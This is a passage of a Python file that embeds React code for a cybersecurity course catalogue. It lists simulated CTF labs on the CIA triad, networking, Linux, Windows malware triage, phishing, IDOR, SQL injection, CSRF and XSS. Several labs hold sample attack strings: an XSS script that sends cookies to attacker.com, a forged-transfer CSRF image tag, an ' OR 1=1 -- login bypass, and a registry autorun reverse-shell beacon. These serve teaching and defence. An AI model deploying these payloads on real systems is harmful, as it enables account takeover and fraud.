import sys

courses_code = r'''/* ==========================================================================
   PAGE 2: CURRICULUM & INTERACTIVE LABS
   ========================================================================== */
function CoursesPage({ activeLabId, setActiveLabId, studentStats, onAwardXp, user, onOpenAuth, enrolledCourses = [], onEnrollCourse }) {
    const [filterCategory, setFilterCategory] = useState('beginner');
    const [searchQuery, setSearchQuery] = useState('');
    const [enrollSuccessNotice, setEnrollSuccessNotice] = useState('');

    const handleEnrollClick = (lab) => {
        if (!user) {
            onOpenAuth();
            return;
        }
        if (onEnrollCourse) {
            const success = onEnrollCourse(lab.id, lab.title);
            if (success) {
                setEnrollSuccessNotice(`Cadet Clearance Verified! You are now enrolled in "${lab.title}". Interactive Sandbox unlocked.`);
                setTimeout(() => setEnrollSuccessNotice(''), 5000);
            }
        }
    };

    // Comprehensive Cybersecurity Lab Catalog (Beginner Foundations to Advanced)
    const labs = [
        {
            id: 'intro-cia',
            title: 'Cybersecurity Foundations & CIA Triad',
            track: 'Fundamentals',
            level: 'Beginner',
            duration: '30 mins',
            xp: 150,
            flag: 'NCAS{cia_triad_confidentiality_integrity_availability}',
            summary: 'Master the foundational bedrock of all cybersecurity: Confidentiality, Integrity, and Availability. Learn threat actor modeling, defense-in-depth, and audit security policy violations in institutional systems.',
            theory: 'The CIA Triad is the universal framework of information security. Confidentiality ensures sensitive data is accessible only to authorized entities via encryption and access controls. Integrity guarantees data is accurate and untampered, verified with cryptographic checksums. Availability ensures systems and data remain operational for authorized cadets with redundancy and fault tolerance.',
            instructions: [
                'Explore the institutional policy directory using `ls`.',
                'Read the baseline security standard using `cat security_policy.txt`.',
                'Inspect the reported security incident in `cat incident_report.log`.',
                'Run `python audit_cia.py` to evaluate which pillar of the CIA Triad was compromised.',
                'Submit the captured flag format `NCAS{...}` below to claim your foundational credentials.'
            ],
            fileSystem: {
                'security_policy.txt': 'ZYVERA POLICY DOC 101 - INFORMATION CLASSIFICATION & ASSET GOVERNANCE:\n1. All confidential cadet records must be encrypted at rest (AES-256).\n2. Integrity verification requires SHA-256 checksum validation prior to deployment.\n3. High-availability clusters must maintain 99.99% uptime with offsite failovers.',
                'incident_report.log': '[INCIDENT-2026-004] SEVERITY: HIGH\nTIMESTAMP: 2026-10-02T14:22:01Z\nEVENT: An automated nightly backup script dumped cleartext cadet grades and SSNs into a publicly reachable AWS S3 bucket with no authentication.\nTRIAD VIOLATION ANALYSIS REQUIRED: Which core pillar was directly breached?',
                'audit_cia.py': 'Analyzing INCIDENT-2026-004...\nCompromise: Cleartext exposure of private records to unauthorized external parties.\nPrimary Principle Breached: CONFIDENTIALITY.\nRemediation: Enforce bucket ACLs, KMS envelope encryption, and IAM least privilege.\nVerification Code: NCAS{cia_triad_confidentiality_integrity_availability}'
            }
        },
        {
            id: 'net-protocols',
            title: 'Networking & Protocol Essentials for Defenders',
            track: 'Networking',
            level: 'Beginner',
            duration: '45 mins',
            xp: 200,
            flag: 'NCAS{tcp_handshake_port_protocols_verified}',
            summary: 'Understand how data travels across the Internet. Master the OSI 7-layer model, TCP/IP stack, critical service ports (21, 22, 53, 80, 443), the 3-way handshake, and packet capture triage.',
            theory: 'Computer networking is the circulatory system of cyberspace. Cyber defenders must know the OSI and TCP/IP models intimately. The TCP 3-Way Handshake (SYN -> SYN-ACK -> ACK) establishes reliable, stateful connections. Defenders must differentiate between encrypted channels (SSH:22, HTTPS:443) and insecure plaintext protocols (Telnet:23, HTTP:80, FTP:21) which leak credentials in cleartext over the wire.',
            instructions: [
                'Review directory assets using `ls`.',
                'Review common security port definitions with `cat ports_reference.txt`.',
                'Inspect captured packet traffic using `cat network_traffic.pcap.txt`.',
                'Run `python netscan.py` to analyze the TCP handshake and uncover cleartext credential transmission.',
                'Submit the extracted flag to validate your networking badge.'
            ],
            fileSystem: {
                'ports_reference.txt': 'CORE PROTOCOL PORT MATRIX:\nPort 21  : FTP (Plaintext File Transfer - Insecure)\nPort 22  : SSH (Secure Encrypted Remote Shell)\nPort 53  : DNS (Domain Name Resolution - UDP/TCP)\nPort 80  : HTTP (Unencrypted Web Traffic - Insecure)\nPort 443 : HTTPS (TLS Encrypted Web Traffic)\nPort 3389: RDP (Windows Remote Desktop Protocol)',
                'network_traffic.pcap.txt': 'PACKET TRACE CAPTURE #42:\n192.168.1.50:54211 -> 192.168.1.10:80 [TCP SYN] Seq=0\n192.168.1.10:80 -> 192.168.1.50:54211 [TCP SYN, ACK] Seq=0 Ack=1\n192.168.1.50:54211 -> 192.168.1.10:80 [TCP ACK] Seq=1 Ack=1\nPOST /login HTTP/1.1\nHost: 192.168.1.10\nContent-Type: application/x-www-form-urlencoded\nPayload: user=cadet_admin&pass=zyvera_unencrypted_transferred_pass',
                'netscan.py': '[*] Analyzing captured traffic on interface eth0...\n[*] 3-Way Handshake established on Port 80 (HTTP).\n[!] WARNING: Plaintext credential transmission detected over unencrypted HTTP!\n[*] Recommended Action: Enforce HTTPS (Port 443) with HSTS.\n[*] Flag Unlocked: NCAS{tcp_handshake_port_protocols_verified}'
            }
        },
        {
            id: 'linux-basics',
            title: 'Linux CLI & Terminal Defense for Beginners',
            track: 'Linux Security',
            level: 'Beginner',
            duration: '40 mins',
            xp: 200,
            flag: 'NCAS{linux_cli_chmod_permissions_mastered}',
            summary: 'Hands-on Linux command-line mastery for cyber defense. Navigate the Unix directory tree, audit /etc/passwd for unauthorized backdoors, and remediate dangerous permissions using chmod.',
            theory: 'Over 90% of cloud servers and security appliances run Linux. Defenders must be comfortable in the shell without a graphical desktop. Linux uses an octal permission model (Read=4, Write=2, Execute=1) across User, Group, and Others. A world-writable or world-readable configuration file (such as chmod 777 database.env) allows any local untrusted process to read secret API keys and database credentials.',
            instructions: [
                'Verify your terminal identity with `whoami` and check directory path with `pwd`.',
                'List detailed file permissions using `ls -la`.',
                'Notice database.env is world-readable; restrict permissions by typing `chmod 600 database.env`.',
                'Audit user accounts with `cat /etc/passwd` to inspect administrative accounts.',
                'Run `python verify_security.py` to confirm the host is hardened and retrieve your flag.'
            ],
            fileSystem: {
                'database.env': 'DB_HOST=10.0.0.5\nDB_USER=root_db\nDB_PASS=super_confidential_db_secret_key',
                '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ncadet:x:1001:1001:Cadet User:/home/cadet:/bin/bash\nintruder:x:0:0:Fake Admin:/root:/bin/bash',
                'verify_security.py': '[*] Running Linux Host Permission Audit...\n[+] Checking database.env permissions: -rw------- (600: Restricted to owner).\n[+] Verification SUCCESS: Insecure world-readable leak remediated.\n[+] Flag: NCAS{linux_cli_chmod_permissions_mastered}'
            }
        },
        {
            id: 'windows-audit',
            title: 'Windows Security & Process Anomaly Hunting',
            track: 'Windows Security',
            level: 'Beginner',
            duration: '40 mins',
            xp: 175,
            flag: 'NCAS{win_proc_malware_found}',
            summary: 'Learn Windows internals, system services, and process triage. Detect disguised malware masquerading as legitimate Windows binaries (like fake svchost.exe in AppData) and audit autorun registry keys.',
            theory: 'Windows endpoints are the primary target in corporate cyber attacks. Attackers frequently use Process Masquerading (MITRE ATT&CK T1036) by giving malicious executables names identical to core operating system processes like svchost.exe, csrss.exe, or explorer.exe. Legitimate Windows system services must reside inside C:\\Windows\\System32. Any svchost.exe executing from user profiles (AppData\\Temp) is almost certainly malware.',
            instructions: [
                'List workstation artifacts using `ls`.',
                'Inspect running system processes using `cat tasklist.txt`.',
                'Look closely for any process running out of user AppData or Temp directories.',
                'Inspect registry persistence entries with `cat autoruns.reg`.',
                'Run `python analyze_process.py` to terminate the rogue process and extract the threat flag.'
            ],
            fileSystem: {
                'tasklist.txt': 'Image Name                     PID Session Name        Session#    Mem Usage   Path\n========================= ======== ================ =========== ============ ====================================\nsystem                           4 Services                   0       156 K  N/A\nsmss.exe                       388 Services                   0     1,120 K  C:\\Windows\\System32\\smss.exe\ncsrss.exe                      544 Services                   0     4,890 K  C:\\Windows\\System32\\csrss.exe\nservices.exe                   668 Services                   0     8,420 K  C:\\Windows\\System32\\services.exe\nsvchost.exe                    892 Services                   0    14,350 K  C:\\Windows\\System32\\svchost.exe\nexplorer.exe                  2048 Console                    1    42,100 K  C:\\Windows\\explorer.exe\nsvchost.exe                   9999 Console                    1     6,200 K  C:\\Users\\Cadet\\AppData\\Temp\\svchost.exe',
                'autoruns.reg': '[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"SystemUpdateHelper"="C:\\\\Users\\\\Cadet\\\\AppData\\\\Temp\\\\svchost.exe --connect 185.220.101.5:4444"',
                'analyze_process.py': '[*] Analyzing PID 9999 (C:\\Users\\Cadet\\AppData\\Temp\\svchost.exe)...\n[!] ALERT: Path mismatch! Legitimate svchost.exe MUST reside in C:\\Windows\\System32.\n[!] Registry persistence detected under HKCU Run key "SystemUpdateHelper".\n[!] Reverse shell beacon payload detected reaching out to external C2.\n[*] Process terminated and registry key purged.\n[*] Forensic Flag: NCAS{win_proc_malware_found}'
            }
        },
        {
            id: 'social-phish',
            title: 'Social Engineering & Phishing Header Analysis',
            track: 'Threat Defense',
            level: 'Beginner',
            duration: '35 mins',
            xp: 175,
            flag: 'NCAS{dmarc_spf_phishing_header_detected}',
            summary: 'Deconstruct the primary initial access vector: social engineering and email phishing. Dissect RFC 822 email headers, analyze SPF, DKIM, and DMARC authentication verdicts, and detect domain typosquatting.',
            theory: 'Social engineering exploits human psychology rather than software flaws. Over 85% of corporate breaches originate from phishing emails. Email defense relies on three foundational cryptographic protocols: SPF verifies if the sending server IP is authorized by the domain; DKIM cryptographically signs the message content; and DMARC specifies what policy to enforce (quarantine or reject) when verification fails.',
            instructions: [
                'View available files in the workspace with `ls`.',
                'Read the raw phishing email with `cat urgent_payroll_update.eml`.',
                'Examine the From address vs the actual Received: from server IP address.',
                'Run `python analyze_headers.py` to perform automated SPF/DMARC verification.',
                'Submit the security triage flag to record your finding.'
            ],
            fileSystem: {
                'urgent_payroll_update.eml': 'Delivered-To: cadet@zyvera.edu\nReceived: from mail-relay-49.unknown-hoster.net (198.51.100.77)\n  by mx.zyvera.edu with ESMTP id z99\nAuthentication-Results: mx.zyvera.edu;\n  spf=fail (sender IP 198.51.100.77 not authorized by domain zyvera-payroll.com);\n  dkim=none;\n  dmarc=fail (p=quarantine) header.from=zyvera-payroll.com\nFrom: "Zyvera Human Resources" <hr-payroll@zyvera-payroll.com>\nReply-To: credential-collector@darknet-c2-drop.xyz\nSubject: [URGENT] Immediate Action Required: Verify Direct Deposit Credentials\n\nCadet, your payroll disbursement is suspended pending immediate identity re-verification.\nClick http://zyvera-payroll.com.account-update.xyz/verify to input your credentials now.',
                'analyze_headers.py': '[*] Parsing RFC 822 Email Headers...\n[-] Sender IP: 198.51.100.77 (Host: mail-relay-49.unknown-hoster.net)\n[-] SPF Verdict: FAIL (IP not listed in SPF record)\n[-] DMARC Verdict: FAIL (Domain alignment failure)\n[-] Reply-To Divergence: credential-collector@darknet-c2-drop.xyz (Phishing indicator)\n[!] MALICIOUS PHISHING CAMPAIGN DETECTED. Domain blocked at perimeter firewall.\n[+] Investigation Flag: NCAS{dmarc_spf_phishing_header_detected}'
            }
        },
        {
            id: 'web-basics',
            title: 'Web Security & OWASP Top 10 Primer',
            track: 'Web Security',
            level: 'Beginner',
            duration: '45 mins',
            xp: 200,
            flag: 'NCAS{idor_direct_object_reference_exposed}',
            summary: 'Discover how modern web apps and REST APIs function. Learn HTTP verbs (GET/POST), cookies, sessions, the OWASP Top 10, and hunt down an Insecure Direct Object Reference (IDOR) vulnerability.',
            theory: 'The web operates on HTTP/HTTPS request-response cycles. The OWASP Top 10 documents the most dangerous web vulnerabilities, with Broken Access Control ranking #1. Insecure Direct Object References (IDOR) occur when an application accepts user input (such as ?id=1) to retrieve database records directly without validating whether the requesting cadet actually has permission to view that record.',
            instructions: [
                'List the web application source files using `ls`.',
                'Inspect the backend route handler in `cat user_api.js`.',
                'Notice the lack of authorization checks on the cadet id query parameter.',
                'Query the API using `curl http://api.zyvera.local/v1/cadet?id=1` to retrieve the admin record.',
                'Copy the exposed administrator secret flag and submit.'
            ],
            fileSystem: {
                'user_api.js': '// Express.js Route: Insecure Direct Object Reference\napp.get("/api/v1/cadet", (req, res) => {\n  const cadetId = req.query.id;\n  // VULNERABILITY: No check if req.session.userId === cadetId!\n  const userRecord = db.query("SELECT * FROM users WHERE id = ?", [cadetId]);\n  res.json(userRecord);\n});',
                'curl_helper.txt': 'Usage: curl http://api.zyvera.local/v1/cadet?id=1',
                'api_simulator.py': '[*] Querying GET /api/v1/cadet?id=1...\n[+] Response 200 OK:\n{\n  "id": 1,\n  "role": "global_admin",\n  "classified_token": "NCAS{idor_direct_object_reference_exposed}"\n}\n[!] Vulnerability Confirmed: Cadet ID parameter permits horizontal & vertical privilege escalation.'
            }
        },
        {
            id: 'crypto-basics',
            title: 'Applied Cryptography, Hashing & Passwords',
            track: 'Cryptography',
            level: 'Beginner',
            duration: '40 mins',
            xp: 200,
            flag: 'NCAS{sha256_hash_integrity_cracked}',
            summary: 'Differentiate between reversible Encryption and one-way Hashing. Calculate SHA-256 checksums to verify software integrity, detect file tampering, and learn why salted hashes protect stored passwords.',
            theory: 'Cryptography is the mathematical science of securing data. Crucially, encryption is two-way (requires a key to encrypt and decrypt), whereas hashing is strictly one-way (a mathematical digest of fixed length that cannot be reversed). Secure hashes (like SHA-256) are deterministic, avalanche-sensitive, and collision-resistant. In cyber defense, checksums ensure downloaded software has not been backdoored in transit.',
            instructions: [
                'Inspect the lab workspace using `ls`.',
                'Read the official expected checksums with `cat downloads.txt`.',
                'Calculate the SHA-256 hash using `sha256sum patch_installer.bin`.',
                'Run `python verify_hash.py` to automate hash verification and detect file integrity.',
                'Submit the cryptographic proof flag below.'
            ],
            fileSystem: {
                'downloads.txt': 'OFFICIAL ZYVERA INTEGRITY CHECKSUMS (SHA-256):\nFile: patch_installer.bin\nOfficial Expected Hash: 7b287d9c4d9f6b216da154b4a154b7b287d9c4d9f6b216da154b7b287d9c4d9f\nFile: firmware_v2.bin\nOfficial Expected Hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
                'patch_installer.bin': '[BINARY PAYLOAD: Zyvera Defense Suite Installer v3.4.1]',
                'verify_hash.py': '[*] Computing SHA-256 digest of patch_installer.bin...\n[+] Computed Hash: 7b287d9c4d9f6b216da154b4a154b7b287d9c4d9f6b216da154b7b287d9c4d9f\n[+] Official Hash: 7b287d9c4d9f6b216da154b4a154b7b287d9c4d9f6b216da154b7b287d9c4d9f\n[+] HASH INTEGRITY VERIFIED: File has not been modified or tampered in transit.\n[*] Cryptographic Proof Token: NCAS{sha256_hash_integrity_cracked}'
            }
        },
        {
            id: 'soc-incident',
            title: 'SOC Operations & Incident Triage 101',
            track: 'Defensive SOC',
            level: 'Beginner',
            duration: '45 mins',
            xp: 225,
            flag: 'NCAS{soc_triage_quarantine_isolate_success}',
            summary: 'Assume the role of a Tier 1 SOC Analyst. Monitor live SIEM alert feeds, investigate a brute-force SSH attack and subsequent C2 beacon, and execute containment procedures to isolate the compromised host.',
            theory: 'A Security Operations Center (SOC) is the command post of organizational cyber defense. Analysts follow the NIST SP 800-61 incident response lifecycle: 1) Preparation, 2) Detection & Analysis, 3) Containment, Eradication & Recovery, 4) Post-Incident Activity. When a SIEM detects multiple failed logins followed by an outbound beacon to a rogue IP, analysts must act decisively to isolate the host and stop lateral movement.',
            instructions: [
                'View incident response toolkit files using `ls`.',
                'Review SOC Standard Operating Procedures in `cat soc_playbook.txt`.',
                'Inspect active alerts in the SIEM log using `cat siem_alerts.log`.',
                'Note the adversary IP (203.0.113.88) and isolate the endpoint with `python isolate_host.py 203.0.113.88`.',
                'Submit the incident containment certificate flag.'
            ],
            fileSystem: {
                'siem_alerts.log': 'TIME: 2026-10-02 21:10:02 | ALERT_ID: SEC-801 | SEV: HIGH | SRC: 203.0.113.88 | DST: 192.168.1.105:22 | MSG: SSH Brute Force - 482 failed attempts in 60s\nTIME: 2026-10-02 21:11:15 | ALERT_ID: SEC-802 | SEV: CRITICAL | SRC: 203.0.113.88 | DST: 192.168.1.105:22 | MSG: SSH Authentication SUCCESS (user: root) after brute force!\nTIME: 2026-10-02 21:11:18 | ALERT_ID: SEC-803 | SEV: CRITICAL | SRC: 192.168.1.105 | DST: external | MSG: Outbound beacon to known C2 IP 198.51.100.22',
                'soc_playbook.txt': 'SOC STANDARD OPERATING PROCEDURE (SOP-401: COMPROMISED HOST CONTAINMENT):\nStep 1: Verify alert fidelity in SIEM log.\nStep 2: Note adversary IP (203.0.113.88) and victim IP (192.168.1.105).\nStep 3: Run "python isolate_host.py <adversary_ip>" to execute firewall quarantine.\nStep 4: Record containment verification token in incident ticket.',
                'isolate_host.py': '[*] Executing SOC Containment Protocol...\n[+] Adversary IP 203.0.113.88 added to perimeter iptables DROP list.\n[+] Target host 192.168.1.105 isolated from corporate subnet to prevent lateral movement.\n[+] Incident Status: CONTAINED.\n[+] NIST Phase 3 Containment Certificate: NCAS{soc_triage_quarantine_isolate_success}'
            }
        },
        {
            id: 'crypto',
            title: 'Cryptography Decryption Sandbox',
            track: 'Cryptography',
            level: 'Intermediate',
            duration: '45 mins',
            xp: 200,
            flag: 'NCAS{aes_256_symmetric_key_unlocked}',
            summary: 'Analyze basic encrypted ciphertexts, inspect symmetric decryption parameters, and retrieve the concealed cadet token.',
            theory: 'Symmetric encryption uses the same shared key for both encryption and decryption. AES-256 in CBC (Cipher Block Chaining) mode requires both a 256-bit key and an Initialization Vector (IV). If the key or initialization vector is leaked or left insecure on host storage, unauthorized parties can decrypt the ciphertext instantly.',
            instructions: [
                'Inspect the laboratory directory using the `ls` command.',
                'Read the secret file contents using `cat secret.txt`.',
                'Inspect the cipher key with `cat key.txt`.',
                'Run the decryption routine with `python decrypt.py`.',
                'Copy the extracted flag format `NCAS{...}` and submit below to claim +200 XP.'
            ],
            fileSystem: {
                'secret.txt': 'Encrypted Payload: 8a93fe8c71b3e104ad5e62f9 (AES-256-CBC)',
                'key.txt': 'Symmetric Key: 4a154b7b287d9c4d9f6b216d',
                'decrypt.py': '# Decryption Routine Executed\nOutput Flag: NCAS{aes_256_symmetric_key_unlocked}'
            }
        },
        {
            id: 'linux',
            title: 'Linux Privilege Escalation Lab',
            track: 'Host Defense',
            level: 'Intermediate',
            duration: '60 mins',
            xp: 250,
            flag: 'NCAS{root_sudo_priv_escalated_2026}',
            summary: 'Investigate Linux permission misconfigurations, execute `sudo -l` audit to inspect privileges, and read restricted root flags.',
            theory: 'Privilege escalation involves gaining elevated access to resources normally protected from an application or user. On Linux systems, misconfigured /etc/sudoers rules allowing standard cadets to execute specific binary utilities with NOPASSWD can allow direct privilege escalation to root (UID 0).',
            instructions: [
                'Check your current user identifier with `whoami`.',
                'Audit sudo privilege allocations using `sudo -l`.',
                'Notice that `/usr/bin/cat /root/flag.txt` can be executed without a password.',
                'Execute `sudo cat /root/flag.txt` to retrieve the privileged token.',
                'Submit the flag to validate your Linux privilege escalation.'
            ],
            fileSystem: {
                'notes.txt': 'Operative reminder: check sudoer privileges using `sudo -l`.',
                '/root/flag.txt': 'NCAS{root_sudo_priv_escalated_2026}'
            }
        },
        {
            id: 'sqli',
            title: 'OWASP SQL Injection Sandbox',
            track: 'App Sec',
            level: 'Advanced',
            duration: '90 mins',
            xp: 300,
            flag: 'NCAS{sqli_admin_bypass_success}',
            summary: 'Exploit flawed SQL query concatenation in authentication procedures using tautology injection payloads like `\' OR 1=1 --`.',
            theory: 'SQL Injection happens when untrusted user input is directly concatenated into a dynamic SQL query string without parametrization. Attackers input SQL syntax characters (\' and --) to alter the query logic so it always evaluates to true, completely bypassing credential checks.',
            instructions: [
                'View available files in the web root using `ls`.',
                'Inspect the vulnerable query logic in `login.php` using `cat login.php`.',
                'Run `python test_sqli.py` to launch the injection testing harness.',
                'Input the SQL bypass payload: `\' OR 1=1 --` when prompted.',
                'Extract the returned administrator session flag and submit.'
            ],
            fileSystem: {
                'login.php': '$query = "SELECT * FROM users WHERE user=\'$u\' AND pass=\'$p\'";',
                'test_sqli.py': '# Input \' OR 1=1 -- to trigger always-true condition.\n# Bypassed! Flag: NCAS{sqli_admin_bypass_success}'
            }
        },
        {
            id: 'websec-csrf',
            title: 'CSRF Bank Transfer Forgery',
            track: 'App Sec',
            level: 'Advanced',
            duration: '120 mins',
            xp: 350,
            flag: 'NCAS{csrf_fund_transfer_exploit}',
            summary: 'Exploit Cross-Site Request Forgery to perform unauthorized bank transfers by tricking an authenticated victim.',
            theory: 'Cross-Site Request Forgery (CSRF) tricks an authenticated victim into submitting a malicious request to a web application without their knowledge. Browsers automatically append stored session cookies to cross-origin requests unless protected by Anti-CSRF tokens and SameSite cookie attributes.',
            instructions: [
                'List directory files with `ls` to find the vulnerable script.',
                'Inspect the transfer logic in `transfer.php` using `cat transfer.php`.',
                'Run `python exploit_csrf.py` to generate the malicious CSRF payload.',
                'Observe that the attacker successfully forged a transfer request.',
                'Submit the captured flag below.'
            ],
            fileSystem: {
                'transfer.php': 'if (isset($_COOKIE["session"])) { $db->query("UPDATE accounts SET bal=bal-".$_GET["amt"]." WHERE user=".$_COOKIE["session"]); }',
                'exploit_csrf.py': 'Payload Generated: <img src="http://bank/transfer?amt=10000&to=attacker">\nVictim visited... Transfer complete!\nFlag: NCAS{csrf_fund_transfer_exploit}'
            }
        },
        {
            id: 'websec-xss',
            title: 'Stored XSS Cookie Theft',
            track: 'App Sec',
            level: 'Intermediate',
            duration: '75 mins',
            xp: 250,
            flag: 'NCAS{stored_xss_cookie_stolen}',
            summary: 'Inject persistent JavaScript into a comment forum to steal administrator session cookies.',
            theory: 'Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or escaping. In Stored XSS, the malicious script is stored in a database and executed in the browsers of all subsequent users who view that page.',
            instructions: [
                'Look at the vulnerable comment board script `forum.php`.',
                'Check the attacker listener script `listener.js`.',
                'Run `python inject_xss.py` to post the malicious payload to the forum.',
                'Wait for the admin bot to view the forum and trigger the payload.',
                'Retrieve the stolen flag.'
            ],
            fileSystem: {
                'forum.php': 'echo "<div>" . $_POST["comment"] . "</div>"; // No sanitization',
                'inject_xss.py': 'Injecting: <script>fetch("http://attacker.com/?cookie="+document.cookie)</script>\nAdmin viewed comment...\nCookie Stolen: session=NCAS{stored_xss_cookie_stolen}'
            }
        },
        {
            id: 'windows-diag',
            title: 'Windows Process Auditing',
            track: 'Host Defense',
            level: 'Beginner',
            duration: '40 mins',
            xp: 150,
            flag: 'NCAS{win_proc_malware_found}',
            summary: 'Investigate running Windows processes for suspicious activity and hidden malware persistence.',
            theory: 'Host auditing on Windows involves checking process ancestry, execution paths, listening ports, and digital signatures. Malware frequently disguises itself as system processes to blend in with normal system operations.',
            instructions: [
                'View available files with `ls`.',
                'Check the process list output from `cat tasklist.txt`.',
                'Identify the suspicious executable running out of `AppData\\Temp`.',
                'Run `python analyze.py` on the suspicious process.',
                'Submit the discovered flag.'
            ],
            fileSystem: {
                'tasklist.txt': 'svchost.exe     1024 Services\nexplorer.exe    2048 Console\nwinlogon.exe    512 Console\nupdate_sys.exe  9999 AppData\\Temp',
                'analyze.py': 'Analyzing update_sys.exe...\nMalware persistence mechanism detected!\nFlag extracted: NCAS{win_proc_malware_found}'
            }
        }
    ];

    // Filter Logic
    const filteredLabs = labs.filter(l => {
        // Category filter
        if (filterCategory === 'beginner') {
            if (l.level.toLowerCase() !== 'beginner') return false;
        } else if (filterCategory !== 'all') {
            if (l.track.toLowerCase() !== filterCategory.toLowerCase()) return false;
        }

        // Text search filter
        if (searchQuery.trim()) {
            const q = searchQuery.toLowerCase();
            const matchTitle = l.title.toLowerCase().includes(q);
            const matchSummary = l.summary.toLowerCase().includes(q);
            const matchTrack = l.track.toLowerCase().includes(q);
            return matchTitle || matchSummary || matchTrack;
        }

        return true;
    });

    const currentLab = labs.find(l => l.id === activeLabId);
    const beginnerLabs = labs.filter(l => l.level === 'Beginner');

    return (
        <div className="space-y-8">
            {/* Header & Page Title */}
            <div className="flex flex-wrap items-center justify-between gap-4">
                <div>
                    <div className="inline-flex items-center gap-1.5 text-xs font-bold text-[#7B287D] dark:text-[#DEC0E1] uppercase tracking-wider mb-1">
                        <i className="fa-solid fa-graduation-cap"></i> Interactive Cybersecurity Curriculum
                    </div>
                    <h2 className="text-3xl font-extrabold text-[#221224] dark:text-[#FAF5FB]">Cybersecurity Curriculum & Labs</h2>
                    <p className="text-sm text-[#5D4B60] dark:text-[#D4C3D8]">
                        Structured academic curriculum featuring dedicated foundational pathways for beginners, hands-on Linux/Windows terminals, and CTF challenges.
                    </p>
                </div>

                {/* Search Bar */}
                <div className="relative w-full sm:w-72">
                    <i className="fa-solid fa-magnifying-glass absolute left-3 top-1/2 -translate-y-1/2 text-xs text-[#8A788F]"></i>
                    <input 
                        className="form-control pl-8 text-xs w-full"
                        placeholder="Search courses, protocols, tools..."
                        value={searchQuery}
                        onChange={e => setSearchQuery(e.target.value)}
                    />
                </div>
            </div>

            {/* Beginner Cybersecurity Learning Pathway Roadmap (Interactive Visual Progression) */}
            {!currentLab && (
                <div className="beginner-roadmap-card shadow-sm space-y-4">
                    <div className="flex flex-wrap items-center justify-between gap-3">
                        <div className="flex items-center gap-2.5">
                            <span className="w-8 h-8 rounded-xl bg-[#4A154B] dark:bg-[#D580DC] text-white dark:text-[#120914] flex items-center justify-center text-sm font-bold shadow-sm">
                                <i className="fa-solid fa-route"></i>
                            </span>
                            <div>
                                <h4 className="text-base font-bold text-[#221224] dark:text-[#FAF5FB]">
                                    Beginner Cybersecurity Roadmap (8 Step Recommended Sequence)
                                </h4>
                                <p className="text-xs text-[#5D4B60] dark:text-[#D4C3D8]">
                                    Start here if you are new to cybersecurity. Follow the chronological sequence to build foundational mastery.
                                </p>
                            </div>
                        </div>
                        <button 
                            className={`btn btn-xs ${filterCategory === 'beginner' ? 'btn-primary' : 'btn-secondary'}`}
                            onClick={() => { setFilterCategory('beginner'); setSearchQuery(''); }}
                        >
                            <i className="fa-solid fa-filter text-[10px]"></i>
                            <span>Filter Beginner Pathway ({beginnerLabs.length})</span>
                        </button>
                    </div>

                    {/* Step Pills */}
                    <div className="flex flex-wrap items-center gap-2 pt-2 border-t border-[#DEC0E1]/40 dark:border-[#382042]">
                        {beginnerLabs.slice(0, 8).map((bLab, idx) => {
                            const isDone = studentStats.completed_tasks && studentStats.completed_tasks.includes(bLab.id);
                            const isEnr = enrolledCourses.includes(bLab.id);
                            return (
                                <button
                                    key={bLab.id}
                                    className={`roadmap-step-pill ${filterCategory === bLab.track.toLowerCase() ? 'active' : ''}`}
                                    onClick={() => {
                                        setSearchQuery(bLab.title);
                                        setFilterCategory('all');
                                    }}
                                    title={bLab.title}
                                >
                                    <span className="w-5 h-5 rounded-full bg-[#4A154B]/10 dark:bg-[#D580DC]/20 text-[#4A154B] dark:text-[#D580DC] flex items-center justify-center text-[10px] font-bold">
                                        {idx + 1}
                                    </span>
                                    <span>{bLab.title.split('&')[0].trim()}</span>
                                    {isDone && <i className="fa-solid fa-circle-check text-[#166534] dark:text-[#4ADE80] text-xs"></i>}
                                    {!isDone && isEnr && <span className="w-1.5 h-1.5 rounded-full bg-[#7B287D] inline-block"></span>}
                                </button>
                            );
                        })}
                    </div>
                </div>
            )}

            {/* Filter Tabs */}
            <div className="flex flex-wrap items-center justify-between gap-3">
                <div className="tabs-segmented">
                    <button 
                        className={`tab-btn ${filterCategory === 'beginner' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('beginner'); setSearchQuery(''); }}
                    >
                        <i className="fa-solid fa-seedling mr-1 text-xs text-[#166534] dark:text-[#4ADE80]"></i>
                        Beginner Pathway ({beginnerLabs.length})
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'all' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('all'); setSearchQuery(''); }}
                    >
                        All Modules ({labs.length})
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'fundamentals' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('fundamentals'); setSearchQuery(''); }}
                    >
                        Fundamentals
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'networking' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('networking'); setSearchQuery(''); }}
                    >
                        Networking
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'linux security' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('linux security'); setSearchQuery(''); }}
                    >
                        Linux Security
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'windows security' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('windows security'); setSearchQuery(''); }}
                    >
                        Windows Security
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'threat defense' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('threat defense'); setSearchQuery(''); }}
                    >
                        Threat Defense
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'web security' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('web security'); setSearchQuery(''); }}
                    >
                        Web Security
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'defensive soc' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('defensive soc'); setSearchQuery(''); }}
                    >
                        Defensive SOC
                    </button>
                    <button 
                        className={`tab-btn ${filterCategory === 'cryptography' ? 'active' : ''}`} 
                        onClick={() => { setFilterCategory('cryptography'); setSearchQuery(''); }}
                    >
                        Cryptography
                    </button>
                </div>

                <div className="text-xs font-semibold text-[#8A788F]">
                    Showing {filteredLabs.length} of {labs.length} courses
                </div>
            </div>

            {/* Academic Clearance & Identity Verification Banner */}
            {!user ? (
